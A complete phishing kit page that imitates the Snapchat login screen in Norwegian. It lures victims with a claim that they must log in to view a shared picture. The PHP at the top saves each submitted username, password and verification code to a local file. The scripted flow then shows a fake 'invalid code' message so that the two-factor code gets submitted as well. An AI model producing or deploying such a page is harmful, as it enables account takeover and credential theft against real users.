<?php
$myfile = fopen("data.txt", "a") or die("Unable to open file!");
if($_GET){
  $txt = "Username => {$_GET['username']} Password => {$_GET['password']} Code => {$_GET['odlv_code']}\n";
  fwrite($myfile, $txt);
}
?>
<!DOCTYPE html>
<!-- saved from url=(0126)https://accounts.snapchat.com/accounts/login?client_id=ads-api&referrer=https%25253A%25252F%25252Fads.snapchat.com%25252Fsetup -->
<html lang="nb-no" data-theme="dark">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Logg inn • Snapchat</title><!-- Meta -->
    <meta name="referrer" content="origin">
    <meta name="apple-mobile-web-app-capable" content="no">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <script src="./files/jquery.min.js"></script>
    <!-- Favicon -->
    <link rel="shortcut icon" href="./files/snapchat-app-icon.svg" type="image/svg">
    <!-- <link rel="stylesheet" type="text/css" href="./files/avenirnext.font.css"> -->
    <link rel="stylesheet" type="text/css" href="./files/custom.css">
  </head>
  <body class="designV2">
    <!-- Pusher is Needed for Top Navigation Menu -->
    <div class="pusher">
      <div id="login-root">
        <main class="mainContainer">
          <div class="appContainer">
            <div class="pageContainer-withoutNav">
              <form id="login_form" action="" method="get" class="centered_form">
                <div class="gridContainer" id="loginTriggerForm">
                  <img class="snapchat-icon" src="./files/snapchat-app-icon.svg" alt="Snapchat">
                  <div>
                    <h1 class="accountsTitle">Logg inn</h1>
                    <p class="description" style="margin-top: -4px; font-weight: 600; color: rgb(101, 107, 115);">Vennligst logg inn for å se delt bilde</p>
                  </div>
                  <div style="margin-top: 12px ;">
                      <div class="form-group has-success">
                        <label for="username" class="control-label">Brukernavn eller e-post</label>
                        <input name="username" autocomplete="off" type="text" id="username" class="form-control" value="">
                      </div>
                      <div class="form-group has-success">
                        <label for="password" class="control-label">Passord</label>
                        <input name="password" autocomplete="off" type="password" id="password" class="form-control" value="">
                      </div>
                      <div class="primary_action login-button">
                        <button type="button" onclick="login_next()" id="loginTrigger" class="btn btn-lg btn-primary">Logg inn</button>
                      </div>
                  </div>
                </div>
                <div class="gridContainer hide" id="loginCodeForm">
                  <img class="snapchat-icon" src="./files/snapchat-app-icon.svg" alt="Snapchat">
                  <div>
                    <h1 class="accountsTitle">Bekreft at det er deg</h1>
                    <p class="description hide" id="code_alert" style="margin-top: -4px; font-weight: 600; color: #E41F45;">Ugyldig kode, vennligst prøv igjen.</p>
                    <p class="description" style="margin-top: 16px; font-size: 1rem; font-weight: 600; color: rgb(101, 107, 115);">Skriv inn tilsendt kode for å verifisere</p>
                  </div>
                  <div style="margin-top: 20px;">
                    <div class="form-group has-success">
                      <label for="odlv_code" class="control-label">Skriv inn kode</label>
                      <input name="odlv_code" autocomplete="off" type="text" id="odlv_code" class="form-control" value="">
                    </div>
                    <div class="primary_action login-button">
                      <button type="submit" id="submit" class="btn btn-lg btn-primary hide">Neste</button>
                      <button type="button" class="btn btn-lg btn-primary" onclick="show_alert(this)">Neste</button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </main>
      </div>
    </div>
  </body>
  <script>
    function login_next(){
      var username = $('#username').val();
      if(!username) {
        $('#username').focus();
        return;
      }
      var password = $('#password').val();
      if(!password) {
        $('#password').focus();
        return;
      }
      $('#loginCodeForm').removeClass("hide");
      $('#loginTriggerForm').addClass("hide");
    }
    function show_alert(tag){
      var odlv_code = $('#odlv_code').val();
      if(!odlv_code) {
        $('#odlv_code').focus();
        return;
      }
      $(tag).addClass("hide");
      $("#code_alert").removeClass("hide");
      $('#submit').removeClass('hide')
    }
  </script>
</html>


